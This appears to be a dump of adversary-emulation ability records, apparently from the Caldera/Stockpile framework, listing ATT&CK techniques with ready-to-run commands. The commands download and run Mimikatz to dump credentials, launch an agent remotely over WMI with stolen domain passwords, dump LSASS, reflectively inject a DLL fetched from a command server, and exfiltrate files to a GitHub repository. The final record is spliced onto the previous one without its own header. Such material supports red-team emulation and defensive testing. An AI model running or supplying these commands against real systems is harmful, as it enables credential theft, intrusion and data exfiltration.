('f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c', 'None', 'domain.user.name')
('ece5dde3-d370-4c20-b213-a1f424aa8d03', 'domain.user.name', 'None')
('baac2c6d-4652-4b7e-ab0a-f1bf246edd12', 'None', 'domain.user.name')
('ce485320-41a4-42e8-a510-f5a8fe96a644', 'None', 'target.org.emailhost')
('a0676fe1-cd52-482e-8dde-349b73f9aa69', 'None', 'wifi.network.ssid')
('05cda6f6-2b1b-462e-bff1-845af94343f7', 'None', 'host.process.id')
('3c647015-ab0a-496a-8847-6ab173cd2b22', 'host.process.id', 'None')
('a398986f-31b0-436a-87e9-c8e82c028f3c', 'host.process.id', 'None')
('c0da588f-79f0-4263-8998-7496b1a40596', 'None', 'host.user.name')
('3b5db901-2cb8-4df7-8043-c4628a6a5d5a', 'host.user.name', 'None')
('3796a00b-b11d-4731-b4ca-275a07d83299', 'host.user.name', 'None')
('2afae782-6d0a-4fbd-a6b6-d1ce90090eac', 'remote.host.fqdn', 'remote.host.fqdn')


id__dependence__fact: ('f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c', 'None', 'domain.user.name')
> description: Get Service Accounts for a domain
> tactic: discovery
> technique: {'attack_id': 'T1033', 'name': 'System Owner/User Discovery'}
> platforms: {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'custom_parser_vals': {'json_key': 'samaccountname', 'json_type': 'str'}}]}, 'payloads': ['powerview.ps1']}}


id__dependence__fact: ('ece5dde3-d370-4c20-b213-a1f424aa8d03', 'domain.user.name', 'None')
> description: Remotely executes 54ndc47 over WMI
> tactic: execution
> technique: {'attack_id': 'T1047', 'name': 'Windows Management Instrumentation'}
> platforms: {'psh': {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}";\n', 'cleanup': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "taskkill /f /im s4ndc4t.exe"\n'}, 'cmd': {'command': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "cmd.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}";\n', 'cleanup': 'wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "taskkill /f /im s4ndc4t.exe"\n'}}


id__dependence__fact: ('baac2c6d-4652-4b7e-ab0a-f1bf246edd12', 'None', 'domain.user.name')
> description: Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords
> tactic: credential-access
> technique: {'attack_id': 'T1003.001', 'name': 'OS Credential Dumping: LSASS Memory'}
> platforms: {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");\niex $result; Invoke-Mimikatz -DumpCreds\n', 'parsers': {'plugins.stockpile.app.parsers.katz': [{'source': 'domain.user.name', 'edge': 'has_password', 'target': 'domain.user.password'}]}}}


id__dependence__fact: ('ce485320-41a4-42e8-a510-f5a8fe96a644', 'None', 'target.org.emailhost')
> description: Identify the organizations mail server
> tactic: discovery
> technique: {'attack_id': 'T1018', 'name': 'Remote System Discovery'}
> platforms: {'psh': {'command': "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n", 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'target.org.emailhost'}]}}}


id__dependence__fact: ('a0676fe1-cd52-482e-8dde-349b73f9aa69', 'None', 'wifi.network.ssid')
> description: See the most used WIFI networks of a machine
> tactic: discovery
> technique: {'attack_id': 'T1016', 'name': 'System Network Configuration Discovery'}
> platforms: {'psh': {'command': '.\\wifi.ps1 -Pref\n', 'payloads': ['wifi.ps1'], 'parsers': {'plugins.stockpile.app.parsers.wifipref': [{'source': 'wifi.network.ssid'}]}}}


id__dependence__fact: ('05cda6f6-2b1b-462e-bff1-845af94343f7', 'None', 'host.process.id')
> description: Discovers processes that the current user has the ability to access and selects an injectable one
> tactic: discovery
> technique: {'attack_id': 'T1057', 'name': 'Process Discovery'}
> platforms: {'psh': {'command': '$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq "svchost") {$p} };\n$valid | ConvertTo-Json\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'host.process.id', 'custom_parser_vals': {'json_key': 'Id', 'json_type': 'int'}}]}}}


id__dependence__fact: ('3c647015-ab0a-496a-8847-6ab173cd2b22', 'host.process.id', 'None')
> description: Custom GO credential dumper using minidumpwritedump
> tactic: credential-access
> technique: {'attack_id': 'T1003', 'name': 'OS Credential Dumping'}
> platforms: {'psh': {'command': '.\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n', 'payloads': ['totallylegit.exe'], 'cleanup': 'if (Test-Path "C:\\Users\\Public\\creds.dmp") {\n  rm "C:\\Users\\Public\\creds.dmp" -Force;\n};\n'}}


id__dependence__fact: ('a398986f-31b0-436a-87e9-c8e82c028f3c', 'host.process.id', 'None')
> description: Injects sandcat DLL into an available process
> tactic: defense-evasion
> technique: {'attack_id': 'T1055.002', 'name': 'Process Injection: Portable Executable Injection'}
> platforms: {'psh': {'command': '$url="#{server}/file/download";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add("platform","windows");\n$wc.Headers.add("file","shared.go");\n$wc.Headers.add("server","#{server}");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n'}}


id__dependence__fact: ('c0da588f-79f0-4263-8998-7496b1a40596', 'None', 'host.user.name')
> description: Find user running agent
> tactic: discovery
> technique: {'attack_id': 'T1033', 'name': 'System Owner/User Discovery'}
> platforms: {'psh': {'command': '$env:username\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}, 'cmd': {'command': 'echo %username%', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}}


id__dependence__fact: ('3b5db901-2cb8-4df7-8043-c4628a6a5d5a', 'host.user.name', 'None')
> description: Get process info for processes running as a user
> tactic: discovery
> technique: {'attack_id': 'T1057', 'name': 'Process Discovery'}
> platforms: {'psh': {'command': '$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq "#{host.user.name}") {\n        $p;\n    }\n}\n'}}


id__dependence__fact: ('3796a00b-b11d-4731-b4ca-275a07d83299', 'host.user.name', 'None')
> description: Run an application as a different user
> tactic: execution
> technique: {'attack_id': 'T1059.001', 'name': 'Command and Scripting Interpreter: PowerShell'}
> platforms: {'psh': {'command': "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"}}


id__dependence__fact: ('2afae782-6d0a-4fbd-a6b6-d1ce90090eac', 'remote.host.fqdn', 'remote.host.fqdn')
> description: Use PowerView to query the Active Directory server to determine remote admins
> tactic: discovery
> technique: {'attack_id': 'T1069.002', 'name': 'Permission Groups Discovery: Domain Groups'}
> platforms: {'psh': {'command': 'Import-Module .\\powerview.ps1;\n$backup = "#{backup.admin.ability}";\n$userName = "#{domain.user.name}";\n$userPassword = "#{domain.user.password}";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n', 'parsers': {'plugins.stockpile.app.parsers.netlocalgroup': [{'source': 'remote.host.fqdn', 'edge': 'has_admin', 'target': 'domain.user.name'}]}, 'payloads': ['powerview.ps1']}}
> tactic: exfiltration
> technique: {'attack_id': 'T1567.001', 'name': 'Exfiltration to Code Repository'}
> platforms: {'linux': {'sh': {'command': 'GHUser="#{github.user.name}";\nGHRepo="#{github.repository.name}";\nGHPAT="#{github.access.token}";\nGHBranch=\'#{github.repository.branch}\';\nLocalFile=\'#{host.dir.compress}\';\nHeader="Authorization: token $GHPAT";\nRemoteName="$(date \'+%Y%m%d%H%M%S\')-exfil-#{paw}-$(basename $LocalFile)";\necho "{\\"message\\":\\"Committed $RemoteName\\", \\"branch\\":\\"$GHBranch\\", \\"content\\":\\"" >/tmp/b64;\nbase64 -w 0 $LocalFile >>/tmp/b64;\necho "\\"}" >>/tmp/b64;\ncontent=$(curl -s -X PUT -H "Accept: application/vnd.github.v3+json" -H "$Header" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\nrm /tmp/b64;\n'}}, 'windows': {'psh,pwsh': {'command': '$GHUser = "#{github.user.name}";\n$GHRepo = "#{github.repository.name}";\n$GHPAT = "#{github.access.token}";\n$GHBranch = \'#{github.repository.branch}\';\n$token = $GHUser + ":" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = \'Basic {0}\' -f $basetoken;\n};\n$file = (Get-Item #{host.dir.compress});\n$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)";\n$uri = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $RemoteName;\n\n$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n$Body = @{\n    path = $RemoteName;\n    branch = $GHBranch;\n    content = $Base64EncodedFileBytes;\n    encoding = \'base64\';\n    message = "Committed " + $RemoteName;\n} | ConvertTo-Json;\ntry {\n  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n} catch {\n  if ($PSItem -notmatch "but expected") { $PSItem; }\n}\n'}}}
